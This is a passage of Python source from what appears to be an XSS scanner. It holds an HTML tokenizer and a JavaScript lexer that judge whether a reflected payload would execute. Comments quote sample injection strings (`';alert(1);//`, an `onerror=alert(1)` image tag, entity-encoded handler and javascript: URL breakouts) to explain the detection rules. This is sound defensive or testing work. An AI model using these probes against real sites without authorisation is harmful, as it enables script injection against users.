# the element that owns this offset" a local step rather than a re-parse.
_IN_TAG_KINDS = frozenset(("tag",) + _ATTR_VALUE_KINDS)

# Elements whose VALUE-LESS attributes change what their content means, so the tokenizer
# has to spend a lower() on their attribute names (<script nomodule>, <iframe sandbox>).
_BARE_ATTR_ELEMENTS = frozenset({"script", "iframe"})

# Elements that need a second look at their own attributes once the tag is tokenized:
# an <input>'s type decides which events can reach it, an <iframe>'s sandbox decides
# whether its srcdoc can script, and a <meta> may be carrying a CSP.
_POST_PASS_ELEMENTS = frozenset({"input", "iframe", "meta"})

# Carried in a <script> content region instead of a type when the browser never executes
# that content. Not a MIME type, so it can never be mistaken for one.
_SCRIPT_BODY_IGNORED = "\x00ignored"


# PURE
def _scan_tag(html: str, n: int, i: int, tag: str, out: List[_HtmlRegion],
              bare_names: bool = False) -> Tuple[int, bool]:
    """Tokenize one start/end tag starting at `i` (first char after the tag name).

    Appends a region per attribute-name / attribute-value run and returns
    (offset just past the '>', self_closing).

    Regions are emitted GAP-FREE — every offset of the tag belongs to exactly one region,
    delimiters included. A gap would make _region_index_at() return -1 for a payload that
    starts on a quote (`value=""` immediately followed by the injected attributes), and
    "no region" is the fail-open text answer, which is wrong inside a tag.

    `bare_names` records VALUE-LESS attribute names in the region's attr field. It is off
    by default because the lower()-per-attribute it costs is pure waste on the ~7,000
    attributes of an ordinary page: only a handful of elements have a boolean attribute
    that changes what their content means (<script nomodule>, <iframe sandbox>).
    """
    self_closing = False
    run_start = i
    step = _TAG_STEP_RE.match
    while i < n:
        if html[i] == ">":  # by far the commonest step: no leading space, tag over
            out.append((run_start, i + 1, "tag", tag, ""))
            return i + 1, self_closing
        regs = step(html, i).regs
        gt = regs[1][0]
        if gt != -1:
            out.append((run_start, gt + 1, "tag", tag, ""))
            return gt + 1, self_closing
        solidus = regs[2][0]
        if solidus != -1:
            self_closing = html[solidus + 1: solidus + 2] == ">"
            i = solidus + 1
            continue
        name_start, after_name = regs[3]
        if name_start >= n:
            break  # trailing whitespace only: the tag never ended
        self_closing = False
        value_at = regs[4][1]
        if value_at == -1:  # no '=' → the name stands alone, the run continues
            out.append((run_start, after_name, "tag", tag,
                        html[name_start:after_name].lower() if bare_names else ""))
            i = run_start = after_name
            continue
        attr = html[name_start:after_name].lower()
        quote = html[value_at: value_at + 1]
        if quote == '"' or quote == "'":
            value_start = value_at + 1
            out.append((run_start, value_start, "tag", tag, ""))
            close = html.find(quote, value_start)
            if close == -1:  # unterminated value: the rest of the document is the value
                out.append((value_start, n, "attr_value", tag, attr))
                return n, self_closing
            out.append((value_start, close, "attr_value", tag, attr))
            # The closing delimiter itself is back in the tag: a payload that starts ON it
            # is declaring new attributes, not sitting in the value.
            i, run_start = close + 1, close
        else:
            out.append((run_start, value_at, "tag", tag, ""))
            out.append((value_at, regs[5][1], "attr_unquoted", tag, attr))
            i = run_start = regs[5][1]
    return n, self_closing


# PURE
def _scan_html(html: str, limit: int, xml: bool = False) -> Tuple[List[_HtmlRegion],
                                                                 List[Tuple[int, int]], int]:
    """Tokenize `html` left to right into parse-state regions, up to `limit`.

    Replaces the old ``html.rfind('<', 0, pos)`` backward guess, which assumed the nearest
    '<' opened the enclosing tag. That guess mislabelled every value holding a literal '<'
    (a price "Prices < 100", a docs page quoting <div>) and every attribute holding an
    earlier copy of the payload — the multi-occurrence false confirm. A single forward pass
    carries real tokenizer state instead, so no position is ever re-anchored on a guess.

    `limit` is the last offset any caller will ask about. Scanning stops as soon as the
    emitted regions cover it — the predicate only ever needs the parse state AT the payload
    occurrences, so tokenizing the rest of the document is work nobody reads. Regions are
    still emitted whole: the cut is taken between constructs, never inside one.

    `xml` selects the XML parsing rules (an application/xhtml+xml or image/svg+xml
    response). The only difference that reaches this layer is the solidus: in XML `<x/>`
    really does close the element, while in text/html the solidus on a non-void HTML
    element is a parse error and is IGNORED, so `<script src=a/>` opens raw text that
    swallows the rest of the document.

    Returns (regions, inert subtree spans, frameset offset). The spans are <template>
    contents: HTML standard, "the template element" — the contents are parsed into a
    separate, never-rendered document, so nothing in them loads, fires or runs. The
    frameset offset is where a frameset document stopped keeping character data (-1 when
    the document is not one).

    Linear in min(len(html), limit): every branch advances the cursor with one C-level
    scan, and no pattern can backtrack.
    """
    n = len(html)
    lower = html.lower()
    out: List[_HtmlRegion] = []
    inert: List[Tuple[int, int]] = []
    i = data_start = 0
    foreign_depth = 0
    foreign_root = ""
    template_depth = 0
    template_start = -1
    # A <frameset> before any body content makes this a FRAMESET DOCUMENT: from there on
    # the tree builder is in "in frameset"/"after frameset" and every character token and
    # <body> is ignored. The "before any body content" guard is what keeps a stray
    # <frameset> in the middle of a real page from blanking the rest of it.
    frameset = -1
    saw_body = False
    search = _MARKUP_RE.search
    while i < n:
        if data_start > limit:
            # Everything the caller can ask about is covered. A <template> still open at
            # the cut necessarily contains the payload — the tokenizer is already PAST it,
            # so any </template> before it would have been seen — hence close it here
            # rather than lose the span with the early return.
            if template_depth > 0:
                inert.append((template_start, n))
            return out, inert, frameset
        m = search(html, i)
        if m is None:
            break
        lt = m.start()
        name_at, j = m.span(1)
        nxt = html[lt + 1]
        bang = nxt == "!"
        is_comment = bang and html.startswith("<!--", lt)
        is_cdata = bang and (xml or foreign_depth > 0) and lower.startswith("<![cdata[", lt)
        closing = nxt == "/"
        if lt > data_start:  # flush the text run this markup ends
            out.append((data_start, lt, "data", "", ""))
            if not saw_body and frameset < 0 and html[data_start:lt].strip():
                saw_body = True
        if is_comment:
            out.append((lt, _comment_end(html, lt, n), "comment", "", ""))
            i = data_start = out[-1][_R_END]
            continue
        if is_cdata:
            close = html.find("]]>", lt + 9)
            end = n if close == -1 else close + 3
            out.append((lt, end, "cdata", "", ""))
            i = data_start = end
            continue
        if bang or nxt == "?":  # doctype / processing instruction → bogus comment
            close = html.find(">", lt + 1)
            end = n if close == -1 else close + 1
            out.append((lt, end, "comment", "", ""))
            i = data_start = end
            continue
        tag = lower[name_at:j]
        mark = len(out)
        out.append((lt, j, "tag", tag, ""))
        i, self_closing = _scan_tag(html, n, j, tag, out, tag in _BARE_ATTR_ELEMENTS)
        data_start = i
        # One set membership instead of a comparison chain on every one of a page's
        # ~5,000 tags, and never on an END tag, which carries no attributes.
        if tag in _POST_PASS_ELEMENTS and not closing:
            if tag == "input":
                tag = _apply_input_state(html, out, mark)
            elif tag == "iframe":
                _apply_iframe_sandbox(html, out, mark)
            else:
                _apply_meta_csp(html, out, mark)
        if closing:
            if template_depth > 0 and tag == "template":
                template_depth -= 1
                if template_depth == 0:
                    inert.append((template_start, lt))
            elif foreign_depth > 0 and tag in _FOREIGN_ROOTS:
                foreign_depth -= 1
                if foreign_depth == 0:
                    foreign_root = ""
            continue
        if tag == "template":
            if template_depth == 0:
                template_start = i
            template_depth += 1
            continue
        if tag in _FOREIGN_ROOTS:
            if not self_closing:
                if foreign_depth == 0:
                    foreign_root = tag
                foreign_depth += 1
            continue
        if foreign_depth > 0:
            # An SVG <script> is a real script element: its text content is compiled and
            # run. (MathML has no script element — <math><script> is measurably inert in
            # Chromium, so it must NOT be given the same treatment.)
            if foreign_root == "svg" and tag == "script" and not self_closing:
                end = _find_appropriate_end_tag(lower, i, tag)
                out.append((i, end, "rawtext", tag, _script_body_type(html, out, mark)))
                i = data_start = end
                continue
            if (tag in _SVG_INTEGRATION_POINTS if foreign_root == "svg"
                    else tag in _MATHML_INTEGRATION_POINTS):
                foreign_depth = 0  # integration point: the content is parsed as HTML
                foreign_root = ""
                continue
            if tag in _FOREIGN_BREAKOUT_ELEMENTS:
                foreign_depth = 0  # HTML element inside SVG/MathML → back to HTML
                foreign_root = ""
            continue  # foreign content: no RCDATA/RAWTEXT, no PLAINTEXT
        if tag == "body":
            saw_body = True
        elif tag == "frameset" and not saw_body and frameset < 0:
            frameset = lt
        if tag == "plaintext":
            out.append((i, n, "plaintext", tag, ""))
            if template_depth > 0:
                inert.append((template_start, n))
            return out, inert, frameset
        # In text/html the solidus is IGNORED on these elements, so an XHTML-style
        # `<script src=a/>` / `<title/>` / `<textarea/>` opens raw text that runs to the
        # matching end tag (or to EOF) and everything after it stops being markup.
        if tag in _RAW_TEXT_ELEMENTS and not (self_closing and xml):
            end = _find_appropriate_end_tag(lower, i, tag)
            kind = "rcdata" if tag in _RCDATA_ELEMENTS else "rawtext"
            # Carry the element's own body type into the content region: it decides
            # whether a <script> body is executed JavaScript or inert data.
            out.append((i, end, kind, tag,
                        _script_body_type(html, out, mark) if tag == "script" else ""))
            i = data_start = end
    if data_start < n and data_start <= limit:
        out.append((data_start, n, "data", "", ""))
    if template_depth > 0:
        inert.append((template_start, n))
    return out, inert, frameset


# PURE
def _comment_end(html: str, lt: int, n: int) -> int:
    """One past the '>' that closes the comment opened by the "<!--" at `lt`.

    HTML tokenizer, comment start / comment start dash states: a '>' seen there closes the
    comment IMMEDIATELY. "<!-->" and "<!--->" are therefore COMPLETE, empty comments and
    whatever follows them is live markup — the "abrupt-closing comment" parse error.
    """
    p = lt + 4
    if html[p:p + 1] == ">":
        return p + 1
    if html[p:p + 2] == "->":
        return p + 2
    close = _COMMENT_END_RE.search(html, p)
    return n if close is None else close.end()


# PURE
def _script_body_type(html: str, out: List[_HtmlRegion], mark: int) -> str:
    """The body type carried into a <script> element's content region.

    Returns the element's `type` (entity-decoded: attribute values are decoded before the
    type is matched against the JavaScript MIME types), or a sentinel when the browser
    never executes the inline body at all: `src` makes the element load the external
    script and IGNORE its content, and `nomodule` suppresses execution in every browser
    that supports modules — which is every browser that runs the payload.
    """
    script_type = ""
    for region in out[mark:]:
        attr = region[_R_ATTR]
        if not attr:
            continue
        if attr == "src" or attr == "nomodule":
            return _SCRIPT_BODY_IGNORED
        if attr == "type" and not script_type and region[_R_KIND] in _ATTR_VALUE_KINDS:
            raw = html[region[_R_START]:region[_R_END]]
            script_type = (html_module.unescape(raw) if "&" in raw else raw).strip().lower()
    return script_type


# PURE
def _apply_input_state(html: str, out: List[_HtmlRegion], mark: int) -> str:
    """Record an <input>'s effective `type` in the tag label of every region it owns.

    Which events an injected handler can fire depends on it: a hidden input is not
    rendered (nothing can focus, click or hover it) and only `type=image` fetches a
    resource. The FIRST type attribute wins, per the duplicate-attribute rule — so a
    payload that declares its own `type=` after the server's does not change anything.
    """
    state = ""
    for region in out[mark:]:
        if region[_R_ATTR] == "type" and region[_R_KIND] in _ATTR_VALUE_KINDS:
            raw = html[region[_R_START]:region[_R_END]]
            state = (html_module.unescape(raw) if "&" in raw else raw).strip().lower()
            break
    tag = "input" + _ELEMENT_STATE_SEP + (state or "text")
    for k in range(mark, len(out)):
        r = out[k]
        out[k] = (r[_R_START], r[_R_END], r[_R_KIND], tag, r[_R_ATTR])
    return tag


# PURE
def _apply_iframe_sandbox(html: str, out: List[_HtmlRegion], mark: int) -> None:
    """Neutralise `srcdoc` on a sandboxed <iframe>.

    HTML standard, the sandbox attribute: without `allow-scripts` the nested document
    gets an opaque origin and scripting is disabled, so its markup is parsed and nothing
    in it runs. Renaming the attribute (rather than dropping the region) keeps the region
    map gap-free and still lets a payload that ESCAPES the value be judged as tag content
    — the iframe's OWN handlers are outside the sandbox and do fire.
    """
    sandboxed = False
    srcdoc_at = -1
    for k in range(mark, len(out)):
        attr = out[k][_R_ATTR]
        if attr == "sandbox":
            raw = html[out[k][_R_START]:out[k][_R_END]]
            sandboxed = (out[k][_R_KIND] not in _ATTR_VALUE_KINDS
                         or "allow-scripts" not in raw.lower())
        elif attr == "srcdoc" and out[k][_R_KIND] in _ATTR_VALUE_KINDS:
            srcdoc_at = k
    if sandboxed and srcdoc_at != -1:
        r = out[srcdoc_at]
        out[srcdoc_at] = (r[_R_START], r[_R_END], r[_R_KIND], r[_R_TAG],
                          "srcdoc" + _ELEMENT_STATE_SEP + "sandboxed")


# PURE
def _apply_meta_csp(html: str, out: List[_HtmlRegion], mark: int) -> None:
    """Mark the `content` of a <meta http-equiv="Content-Security-Policy"> as a policy.

    Renaming the attribute in the region map is how the policy is carried out of the
    tokenizer: the alternative — a second, regex-driven pass over the document — would be
    the one thing this parser exists to avoid, because a `<meta http-equiv=...>` written
    inside a comment or an attribute value would then be read as a real policy.
    """
    is_csp = False
    content_at = -1
    for k in range(mark, len(out)):
        attr = out[k][_R_ATTR]
        if out[k][_R_KIND] not in _ATTR_VALUE_KINDS:
            continue
        if attr == "http-equiv":
            is_csp = (html[out[k][_R_START]:out[k][_R_END]].strip().lower()
                      == "content-security-policy")
        elif attr == "content":
            content_at = k
    if is_csp and content_at != -1:
        r = out[content_at]
        out[content_at] = (r[_R_START], r[_R_END], r[_R_KIND], r[_R_TAG], _META_CSP_ATTR)


# PURE
def _html_regions(html: str) -> Tuple[_HtmlRegion, ...]:
    """Every parse-state region of the whole document, in document order."""
    return _html_index(html, len(html), False)[0]


# =============================================================================
# JAVASCRIPT TOKEN STATE (PURE)
# =============================================================================
# A reflection inside an inline <script> is NOT judged by markup: <script> content never
# contains tags, so "no </script> in the payload" only proves it cannot escape the
# ELEMENT — it says nothing about escaping the JS STRING, which is how script-context XSS
# actually works (var q = '<?= $q ?>', wp_localize_script, drupalSettings, __NUXT__, gon).
# These are the ECMAScript lexical token kinds, not a heuristic list.

# HTML "classic script" / module: a <script> whose type is absent, empty, a JavaScript
# MIME type or "module" is executed as JS. Any other type (application/json,
# text/x-template, text/x-handlebars) is DATA, so its content stays inert.
_JS_SCRIPT_TYPES = frozenset({
    "", "module", "text/javascript", "application/javascript", "text/ecmascript",
    "application/ecmascript", "text/jscript", "text/livescript", "text/x-javascript",
    "text/x-ecmascript", "application/x-javascript", "application/x-ecmascript",
    "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
    "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
})

# After these keywords a '/' opens a REGULAR EXPRESSION; after an identifier, a number,
# ')' or ']' it is the division operator. Standard ECMAScript lexical-goal disambiguation.
_JS_REGEX_KEYWORDS = frozenset({
    "return", "typeof", "instanceof", "in", "of", "new", "delete", "void", "throw",
    "case", "do", "else", "yield", "await",
})
_JS_IDENT_CHARS = frozenset(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$")
_JS_SPACE = frozenset(" \t\r\n\f\v   ")


class _JsToken(NamedTuple):
    """One non-code ECMAScript token: [start, end] inclusive of both delimiters."""
    start: int   # index of the opening delimiter
    end: int     # index of the CLOSING delimiter (len(js) when never closed)
    kind: str    # string | template | regex | line_comment | block_comment


# PURE
def _js_scan_quoted(js: str, i: int, quote: str) -> int:
    """Index of the delimiter closing the string/template opened at `i` (len when open).

    Backslash-escape aware, which is the whole point of the control this must preserve:
    a server that doubled the backslash (\\\\' ) leaves a FREE quote that closes the
    string, one that escaped the quote itself (\\\\\\' ) does not.
    """
    n = len(js)
    k = i + 1
    while k < n:
        ch = js[k]
        if ch == "\\":
            k += 2
            continue
        if ch == quote:
            return k
        k += 1
    return n


# PURE
def _js_scan_regex(js: str, i: int) -> int:
    """Index of the '/' closing the regex literal opened at `i` (len when unterminated)."""
    n = len(js)
    k = i + 1
    in_class = False
    while k < n:
        ch = js[k]
        if ch == "\\":
            k += 2
            continue
        if ch == "\n":
            return k  # a regex literal cannot span lines
        if ch == "[":
            in_class = True
        elif ch == "]":
            in_class = False
        elif ch == "/" and not in_class:
            return k
        k += 1
    return n


# PURE
def _js_regex_allowed(js: str, i: int) -> bool:
    """True when the '/' at `i` starts a regex literal rather than a division operator.

    Walks backwards over the preceding token INDEX BY INDEX. Slicing `js[:i]` here would
    copy the whole prefix at every '/' in the file, which is quadratic on a script full of
    divisions or URLs — the same shape as the catastrophic-backtracking incident this
    parser exists to avoid. The backward walk is bounded by the length of the token it
    steps over, so the total stays linear in len(js).
    """
    k = i - 1
    while k >= 0 and js[k] in _JS_SPACE:
        k -= 1
    if k < 0:
        return True
    prev = js[k]
    if prev in ")]":
        return False
    if prev in _JS_IDENT_CHARS:
        word_end = k + 1
        while k >= 0 and js[k] in _JS_IDENT_CHARS:
            k -= 1
        return js[k + 1:word_end] in _JS_REGEX_KEYWORDS
    return True


# PURE
@lru_cache(maxsize=16)
def _js_tokens(js: str) -> Tuple[_JsToken, ...]:
    """Lex `js` into its non-code tokens, left to right. Linear, no backtracking."""
    n = len(js)
    out: List[_JsToken] = []
    i = 0
    while i < n:
        ch = js[i]
        if ch in "'\"":
            end = _js_scan_quoted(js, i, ch)
            out.append(_JsToken(i, end, "string"))
            i = end + 1
            continue
        if ch == "`":
            end = _js_scan_quoted(js, i, ch)
            out.append(_JsToken(i, end, "template"))
            i = end + 1
            continue
        if ch == "<" and js.startswith("<!--", i):
            # ECMAScript Annex B.1.1 (normative for web browsers): "<!--" is a
            # SingleLineHTMLOpenComment. Legacy pages that wrap an inline script in
            # `<!-- ... //-->` really do comment out everything after it on that line.
            close = js.find("\n", i + 4)
            end = n if close == -1 else close
            out.append(_JsToken(i, end, "line_comment"))
            i = end + 1
            continue
        if ch == "/" and i + 1 < n:
            nxt = js[i + 1]
            if nxt == "/":
                close = js.find("\n", i + 2)
                end = n if close == -1 else close
                out.append(_JsToken(i, end, "line_comment"))
                i = end + 1
                continue
            if nxt == "*":
                close = js.find("*/", i + 2)
                end = n if close == -1 else close + 1
                out.append(_JsToken(i, end, "block_comment"))
                i = end + 1
                continue
            if _js_regex_allowed(js, i):
                end = _js_scan_regex(js, i)
                out.append(_JsToken(i, end, "regex"))
                i = end + 1
                continue
        i += 1
    return tuple(out)


# PURE
@lru_cache(maxsize=16)
def _js_index(js: str) -> Tuple[Tuple[_JsToken, ...], Tuple[int, ...]]:
    """Tokens plus their start offsets, so a bisect key is never rebuilt per occurrence."""
    tokens = _js_tokens(js)
    return tokens, tuple(t.start for t in tokens)


# PURE
def _js_span_escapes(js: str, start: int, end: int) -> bool:
    """True when the payload occupying [start, end) of `js` reaches the JS engine as CODE.

    Three ways, all of them token-state facts rather than payload signatures:
      * the injection point is already in code position (nothing wraps it);
      * the token wrapping it CLOSES inside the payload span — the payload wrote the
        delimiter that ends the string / template / comment / regex;
      * the wrapper is a template literal and the payload opens an ${...} interpolation,
        which is code without closing the literal.
    Everything else is data. That is exactly the control that must keep rejecting a server
    which escaped the quote away.
    """
    try:
        tokens, starts = _js_index(js)
    except Exception:  # unknown state → fail OPEN
        return True
    idx = bisect_right(starts, start) - 1
    if idx < 0:
        return True  # before every token → code position
    token = tokens[idx]
    if start <= token.start or start > token.end:
        return True  # between tokens, or the payload wrote the opening delimiter → code
    if token.end < end:
        return True  # the payload carries the delimiter that closes the token
    if token.kind == "template":
        if "${" in js[start:end]:
            return True
        if js.rfind("${", token.start, start) > js.rfind("}", token.start, start):
            return True  # the injection point sits inside an ${...} interpolation
    return False


_JS_BRACKET_RE = re.compile(r"[()\[\]{}]")
_JS_BRACKET_OPENER = {")": "(", "]": "[", "}": "{"}

# The DOM/HTML entry points that run the HTML FRAGMENT PARSING ALGORITHM on a string.
# A payload that is inert as JavaScript — safely inside a string literal — is still live
# MARKUP when that literal is handed to one of these, which is the whole of "the server
# escaped my quotes so I am safe" being wrong. The set is the standard's list of
# HTML-parsing sinks, not names harvested off a site; the assignment targets that only
# ever set TEXT (textContent, innerText, setAttribute, value) are deliberately absent.
#
# Anchored at the END of the code that precedes the literal, so only a literal passed
# DIRECTLY to the sink counts. `unescape`/`decodeURI`/`decodeURIComponent` are allowed in
# between because they are pure, total percent-decoders whose output we can reproduce.
_JS_HTML_SINK_RE = re.compile(
    r"(?:"
    r"(?:inner|outer)HTML\s*\+?=|srcdoc\s*\+?="
    r"|document\s*\.\s*(?:write|writeln)\s*\("
    r"|insertAdjacentHTML\s*\(\s*[^,()]{0,32},"
    r")\s*(?:(unescape|decodeURI|decodeURIComponent)\s*\(\s*)?$",
    re.IGNORECASE)
# ECMAScript StringEscapeSequence. The decoded literal is what the parser actually sees,
# so `'\u003cimg src=x onerror=alert(1)\u003e'` is markup even though the response body
# contains no '<' at all.
_JS_ESCAPE_RE = re.compile(
    r"\\(?:u\{([0-9a-fA-F]+)\}|u([0-9a-fA-F]{4})|x([0-9a-fA-F]{2})|\r\n|(.))", re.S)
_JS_ESCAPE_SHORT = {"n": "\n", "t": "\t", "r": "\r", "b": "\b", "f": "\f", "v": "\v",
                    "0": "\0"}


# PURE
def _js_unescape(text: str) -> str:
    """Resolve ECMAScript escape sequences in a string-literal body."""
    def sub(m):
        long_hex, u4, x2, other = m.groups()
        if long_hex is not None or u4 is not None:
            try:
                return chr(int(long_hex or u4, 16))
            except (ValueError, OverflowError):
                return m.group(0)
        if x2 is not None:
            return chr(int(x2, 16))
        if other is None:
            return ""  # escaped line terminator: line continuation
        return _JS_ESCAPE_SHORT.get(other, other)
    return _JS_ESCAPE_RE.sub(sub, text)


# PURE
def _js_wrapping_token(js: str, start: int) -> Optional[_JsToken]:
    """The string/template token that CONTAINS the offset `start`, if any."""
    tokens, starts = _js_index(js)
    idx = bisect_right(starts, start) - 1
    if idx < 0:
        return None
    token = tokens[idx]
    if token.start < start <= token.end and token.kind in ("string", "template"):
        return token
    return None


# PURE
def _js_literal_reaches_html_sink(js: str, start: int, end: int) -> bool:
    """True when the payload sits in a string literal that is PARSED AS HTML by the DOM.

    The classifier's "inside a JS string with no breakout ⇒ inert" rule is right about the
    HTML parser and silent about the DOM: `el.innerHTML = '<payload>'` and
    `document.write('<payload>')` re-parse that same string as markup. The payload is
    judged in the DECODED fragment with the ordinary position rules, so a string the
    server did escape (`&lt;img`) still comes out inert, and a sibling assignment to
    textContent / setAttribute is not a sink at all.
    """
    token = _js_wrapping_token(js, start)
    if token is None or token.end >= len(js):
        return False
    m = _JS_HTML_SINK_RE.search(js[:token.start].rstrip())
    if m is None:
        return False
    fragment = _js_unescape(js[token.start + 1:token.end])
    forms = [js[start:end]]
    decoded = _js_unescape(forms[0])
    if decoded != forms[0]:
        forms.append(decoded)
    if m.group(1):  # the literal is percent-decoded on its way into the sink
        fragment = urllib.parse.unquote(fragment)
        forms += [urllib.parse.unquote(f) for f in tuple(forms)]
    for form in dict.fromkeys(forms):
        if form and form in fragment and any(
                _position_executes(p, form, tag, tail, host)
                for p, tag, tail, host in _reflection_occurrences(fragment, form)):
            return True
    return False


# PURE
def _js_code_balanced(js: str) -> bool:
    """True when `js` shows no structural sign of being unparseable.

    Two one-way tests, both of which prove a SyntaxError when they fail:
      * every bracket OUTSIDE a string/template/regex/comment is matched — a well-formed
        ECMAScript program always balances (), [] and {};
      * no string or template literal runs off the end of the program.
    The converse of neither holds, so this is only ever used to prove FAILURE.
    """
    n = len(js)
    tokens, _ = _js_index(js)
    stack: List[str] = []
    segments: List[str] = []
    pos = 0
    for tok in tokens:
        if tok.end >= n and (tok.kind == "string" or tok.kind == "template"):
            return False  # unterminated literal: the program cannot be compiled
        if tok.start > pos:
            segments.append(js[pos:tok.start])
        pos = min(n, tok.end + 1)
    if pos < len(js):
        segments.append(js[pos:])
    for segment in segments:
        for ch in _JS_BRACKET_RE.findall(segment):
            if ch in "([{":
                stack.append(ch)
            elif not stack or stack.pop() != _JS_BRACKET_OPENER[ch]:
                return False
    return not stack


# PURE
def _js_breakout_parses(js: str, start: int, end: int) -> bool:
    """False when the breakout at [start, end) leaves a program the engine cannot compile.

    An inline classic script (and an event handler, and a javascript: URL) is compiled as
    a WHOLE unit: a SyntaxError anywhere in it discards ALL of it, including the code the
    payload smuggled in. That is why `{query:'PAYLOAD', page:1}` with a `';alert(1);//`
    payload runs nothing — the `//` eats the object literal's own closing brace and the
    script never compiles — while the same payload in `var q='PAYLOAD'` does run.

    DIFFERENTIAL, not absolute: the imbalance only counts against the payload when the
    SAME script balances without it. If our lexer cannot make sense of the page's own
    JavaScript, that is our problem, not evidence of inertness, and we fail OPEN.
    The removal span absorbs any backslash run immediately before the reflection, because
    that escaping is the server's rewrite OF the reflection (see _reflected_forms).
    """
    try:
        if _js_code_balanced(js):
            return True
        at = start
        while at > 0 and js[at - 1] == "\\":
            at -= 1
        return not _js_code_balanced(js[:at] + js[end:])
    except Exception:  # unknown state → fail OPEN
        return True


# HTML event handler content attributes are the `on<eventname>` family — a naming rule in
# the standard, not a list of handler names we would have to keep guessing at.
_EVENT_HANDLER_NAME_RE = re.compile(r"^on[a-z]+$")
# Leading characters a URL parser strips before the scheme (C0 controls + space).
_URL_LEADING_STRIP = "".join(chr(c) for c in range(0x21)) + "\x7f"


# PURE
def _attribute_injection_contexts(html: str, payload: str) -> frozenset:
    """Which ATTRIBUTE-level execution contexts `payload` reaches, per attribute.

    The attribute name comes from the tokenizer, so `<meta content="...">` can no longer
    be read as an `ontent=` event handler, and `srcdoc` is an attribute NAME rather than a
    substring of somebody's text. Whether the payload executes INSIDE the attribute is then
    a JS lexer question — `onclick="filter('PAYLOAD')"` and `href="javascript:go('PAYLOAD')"`
    put the payload inside a JS STRING, which the old `[^"']*?` regexes could not even
    reach, let alone judge.

    An attribute value is ENTITY-DECODED before it is compiled as a handler, parsed as a
    URL or parsed as an srcdoc document, so the check runs on the decoded value. That is
    the canonical "htmlspecialchars(ENT_QUOTES) is not enough inside an event handler"
    bug — onclick="f('&#039;-alert(1)-&#039;')" really does close the JS string — and it
    is what makes href="&#106;avascript:" and an entity-escaped srcdoc work. Entity
    encoding only proves inertness in MARKUP position, which the position classifier owns.

    Returns a subset of {"event_handler", "javascript_uri", "srcdoc"}.
    """
    # An attribute value can only hold the payload verbatim, or hold it entity-encoded —
    # and an entity needs an '&'. A body with neither cannot produce a hit under ANY
    # attribute, so the whole tokenizer is skipped on two C-level scans. This is the
    # dominant case during a payload sweep: most probes never reflect at all.
    if payload not in html and "&" not in html:
        return frozenset()
    found = set()
    url_forms = None
    for value, role, js_at in _attribute_candidates(html):
        if role == "javascript_uri":
            # The URL parser decodes entities and drops tab/newline BEFORE the scheme is
            # read, so `java&#09;script:` and `javascript&colon;` are the same URL — and
            # the payload that produced them no longer appears verbatim in it.
            if url_forms is None:
                url_forms = _url_payload_forms(payload)
            hit = next((f for f in url_forms if f in value), None)
            if hit is not None and _js_value_executes(value, hit, js_at):
                found.add(role)
            continue
        if payload not in value:
            continue
        if role == "srcdoc":
            # The decoded value is parsed as a whole HTML document.
            if any(_position_executes(p, payload, tag, tail, host)
                   for p, tag, tail, host in _reflection_occurrences(value, payload)):
                found.add("srcdoc")
        elif _js_value_executes(value, payload, js_at):
            found.add(role)
    return frozenset(found)


# PURE
def _url_payload_forms(payload: str) -> Tuple[str, ...]:
    """`payload` plus the shapes the URL parser rewrites it into before reading a scheme.

    URL standard: every ASCII tab and newline is removed from the input, and the value it
    is read from was HTML-entity-decoded first. Both are decodings the SERVER did not do
    — they are what the browser does — so the payload has to be looked for in the same
    normalised space as the value.
    """
    forms = [payload]
    if "&" in payload:
        decoded = html_module.unescape(payload)
        if decoded != payload:
            forms.append(decoded)
    for form in tuple(forms):
        stripped = form.translate(_URL_TAB_STRIP)
        if stripped != form:
            forms.append(stripped)
    return tuple(dict.fromkeys(forms))


# PURE
@lru_cache(maxsize=2)
def _attribute_candidates(html: str) -> Tuple[Tuple[str, str, int], ...]:
    """Every attribute value of `html` that could execute AT ALL, already decoded.

    Splits the attribute analysis along the only axis that matters for cost: which
    attribute values are execution sinks is a property of the RESPONSE, while whether a
    given payload escapes inside one is a property of the PROBE. A payload sweep asks the
    second question hundreds of times against the same response, so the first is answered
    once. Everything here — tokenizing, matching the on<event> naming rule, entity-decoding
    the value, recognising the javascript: scheme — is response-only work.

    Returns (decoded value, role, js offset) per sink, where role is one of
    "event_handler" / "javascript_uri" / "srcdoc" and the offset is where the JavaScript
    starts inside the decoded value (0 for a handler, past "javascript:" for a URI).
    A URL attribute that does not carry a javascript: URI is not a sink and is dropped.
    """
    out: List[Tuple[str, str, int]] = []
    regions, _starts, inert, _fs = _html_index(html, len(html), False)
    for region in regions:
        attr = region[_R_ATTR]
        if not attr or region[_R_KIND] not in _ATTR_VALUE_KINDS:
            continue
        tag = region[_R_TAG]
        is_handler = bool(_EVENT_HANDLER_NAME_RE.match(attr))
        is_srcdoc = attr == "srcdoc"
        is_url = (_element_name(tag), attr) in _NAVIGATING_URL_ATTRIBUTES
        if not (is_handler or is_srcdoc or is_url):
            continue
        # Nothing inside a <template>'s contents, and nothing on an element that is never
        # rendered, can fire a handler or start a navigation.
        if tag in _NOT_RENDERED_ELEMENTS or _in_inert_subtree(inert, region[_R_START],
                                                              region[_R_END]):
            continue
        raw = html[region[_R_START]:region[_R_END]]
        value = html_module.unescape(raw) if "&" in raw else raw
        if is_handler:
            out.append((value, "event_handler", 0))
        elif is_srcdoc:
            out.append((value, "srcdoc", 0))
        else:
            url = value.translate(_URL_TAB_STRIP)
            scheme = url.lstrip(_URL_LEADING_STRIP)
            if scheme[:11].lower() == "javascript:":
                out.append((url, "javascript_uri", len(url) - len(scheme) + 11))
    return tuple(out)


# PURE
def _js_value_executes(value: str, payload: str, js_start: int) -> bool:
    """True when `payload`, as reflected in `value`, reaches the JS engine as code.

    `js_start` is where the JavaScript begins inside the attribute value (0 for an event
    handler, past "javascript:" for a URI). A payload that overlaps the scheme itself wrote
    the scheme, so it executes by construction.

    A handler body and a javascript: URL are compiled as whole scripts, so a breakout that
    leaves them unparseable creates no handler and runs no code.
    """
    js = value[js_start:]
    at = value.find(payload)
    while at != -1:
        if at < js_start:
            return True  # the payload supplied (part of) the javascript: scheme
        s, e = at - js_start, at - js_start + len(payload)
        if _js_span_escapes(js, s, e) and _js_breakout_parses(js, s, e):
            return True
        at = value.find(payload, at + 1)
    return False


# PURE
def _inline_script_bodies(html: str) -> List[Tuple[str, int]]:
    """(body, document offset) of every inline <script> that the browser runs as JS."""
    if _SCRIPT_OPEN_RE.search(html) is None:
